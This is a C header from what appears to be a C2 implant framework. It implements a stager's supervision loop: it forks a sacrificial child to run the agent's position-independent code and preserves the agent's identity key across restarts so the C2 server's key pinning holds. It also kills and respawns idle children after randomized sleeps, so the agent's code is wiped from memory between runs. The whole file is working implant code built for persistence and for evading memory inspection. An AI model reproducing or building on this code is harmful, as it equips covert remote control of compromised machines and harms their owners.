#ifndef STAGER_SUPERVISE_H
#define STAGER_SUPERVISE_H

#include <stddef.h>
#include <stdint.h>

#include "syscalls.h"
#include "utils.h"

/*
 * Optional lifecycle supervision for the stager.
 *
 * When enabled, the stager does not run the agent PIC in its own process.
 * Instead it forks a sacrificial child that runs the PIC and keeps the parent
 * clean, so the parent can terminate the child at any time and every byte of
 * agent code/data is reclaimed by the kernel.
 *
 * The parent also owns the agent's ephemeral identity key pair, which MUST
 * survive a restart: the C2 pins the agent's public key at first check-in
 * (TOFU) and rejects a changed key. The key is NOT derived from a seed; the
 * exact private scalar is cached in the parent and handed back through:
 *
 *   FD 100 (KEY_FD_IN):  parent -> child, the cached P-256 scalar (or EOF)
 *   FD 101 (KEY_FD_OUT): child  -> parent, the P-256 scalar in use
 *
 * The PFS session key is deliberately not involved: it is re-negotiated via
 * ECDH on every message tunnel and must never be pinned.
 *
 * The agent signals idleness by raising SIGSTOP on itself. The parent sees
 * WIFSTOPPED, kills the child, then forks a fresh one after a randomized sleep.
 */

typedef void (*supervise_entry_fn)(void *base_addr, size_t total_size);

#define SUPERVISE_KEY_FD_IN 100
#define SUPERVISE_KEY_FD_OUT 101
#define SUPERVISE_KEY_LEN 32

/* Sleep range between lifecycles, in seconds (override with -DSUPERVISE_*). */
#ifndef SUPERVISE_SLEEP_MIN
#define SUPERVISE_SLEEP_MIN 5
#endif
#ifndef SUPERVISE_SLEEP_MAX
#define SUPERVISE_SLEEP_MAX 30
#endif

/* Linux wait/signal ABI constants (the stager is freestanding). */
#define SUPERVISE_WUNTRACED 2
#define SUPERVISE_EINTR 4
#define SUPERVISE_SIGKILL 9
#define SUPERVISE_PR_SET_PDEATHSIG 1
#define SUPERVISE_WIFSTOPPED(status) (((status) & 0x7f) == 0x7f)

struct supervise_timespec {
  long tv_sec;
  long tv_nsec;
};

static inline long supervise_random_u32(void) {
  uint32_t v = 0;
  long n = syscall3(SYS_getrandom, (long)&v, (long)sizeof(v), 0);
  if (n != (long)sizeof(v))
    return 0;
  return (long)v;
}

static inline void supervise_sleep(unsigned min_s, unsigned max_s) {
  if (max_s <= min_s)
    max_s = min_s + 1;
  unsigned span = max_s - min_s;
  unsigned seconds = min_s + (unsigned)(supervise_random_u32() % span);

  struct supervise_timespec req;
  req.tv_sec = (long)seconds;
  req.tv_nsec = 0;
  long rc;
  do {
    rc = syscall2(SYS_nanosleep, (long)&req, (long)&req);
  } while (rc == -SUPERVISE_EINTR);
}

static inline void supervise_close(int fd) { (void)syscall1(SYS_close, fd); }

static inline long supervise_write_all(int fd, const uint8_t *buf, size_t len) {
  size_t off = 0;
  while (off < len) {
    long n = syscall3(SYS_write, fd, (long)(buf + off), len - off);
    if (n <= 0)
      return -1;
    off += (size_t)n;
  }
  return (long)off;
}

static inline long supervise_read_all(int fd, uint8_t *buf, size_t len) {
  size_t off = 0;
  while (off < len) {
    long n = syscall3(SYS_read, fd, (long)(buf + off), len - off);
    if (n < 0)
      return -1;
    if (n == 0)
      break;
    off += (size_t)n;
  }
  return (long)off;
}

/*
 * Run the agent PIC in a sacrificial child, caching and restoring its
 * ephemeral identity key across restarts. Never returns.
 */
__attribute__((noreturn)) static inline void
supervise_run(supervise_entry_fn entry, void *stage_blob, size_t blob_size) {
  uint8_t cached_key[SUPERVISE_KEY_LEN];
  int have_key = 0;

  for (;;) {
    int kin[2] = {-1, -1};
    int kout[2] = {-1, -1};
    if (syscall1(SYS_pipe, (long)kin) < 0)
      exit(1);
    if (syscall1(SYS_pipe, (long)kout) < 0)
      exit(1);

    long pid = syscall0(SYS_fork);
    if (pid < 0)
      exit(1);

    if (pid == 0) {
      /* Child: die with the parent, so killing the stager never leaves an
       * orphaned agent behind. */
      long ppid_before = syscall0(SYS_getppid);
      syscall5(SYS_prctl, SUPERVISE_PR_SET_PDEATHSIG, SUPERVISE_SIGKILL, 0, 0,
               0);
      if (syscall0(SYS_getppid) != ppid_before)
        syscall1(SYS_exit, 0);

      /* Expose the key pipes on the agreed descriptors, then run. */
      supervise_close(kin[1]);
      supervise_close(kout[0]);
      if (kin[0] != SUPERVISE_KEY_FD_IN) {
        syscall2(SYS_dup2, kin[0], SUPERVISE_KEY_FD_IN);
        supervise_close(kin[0]);
      }
      if (kout[1] != SUPERVISE_KEY_FD_OUT) {
        syscall2(SYS_dup2, kout[1], SUPERVISE_KEY_FD_OUT);
        supervise_close(kout[1]);
      }
      entry(stage_blob, blob_size);
      syscall1(SYS_exit, 0);
    }

    /* Parent: hand over the cached key (EOF when there is none), then wait. */
    supervise_close(kin[0]);
    supervise_close(kout[1]);
    if (have_key)
      supervise_write_all(kin[1], cached_key, sizeof(cached_key));
    supervise_close(kin[1]);

    int status = 0;
    long w;
    do {
      w = syscall4(SYS_wait4, pid, (long)&status, SUPERVISE_WUNTRACED, 0);
    } while (w == -SUPERVISE_EINTR);

    /* The child wrote its key before going idle, so it is already buffered. */
    if (supervise_read_all(kout[0], cached_key, sizeof(cached_key)) ==
        (long)sizeof(cached_key)) {
      have_key = 1;
    }
    supervise_close(kout[0]);

    /* Terminate the idle child ourselves: this frees all of its memory. If it
     * already exited, the kill is a harmless ESRCH. */
    syscall2(SYS_kill, pid, SUPERVISE_SIGKILL);
    if (SUPERVISE_WIFSTOPPED(status)) {
      do {
        w = syscall4(SYS_wait4, pid, (long)&status, 0, 0);
      } while (w == -SUPERVISE_EINTR);
    }

    supervise_sleep(SUPERVISE_SLEEP_MIN, SUPERVISE_SLEEP_MAX);
  }
}

#endif /* STAGER_SUPERVISE_H */
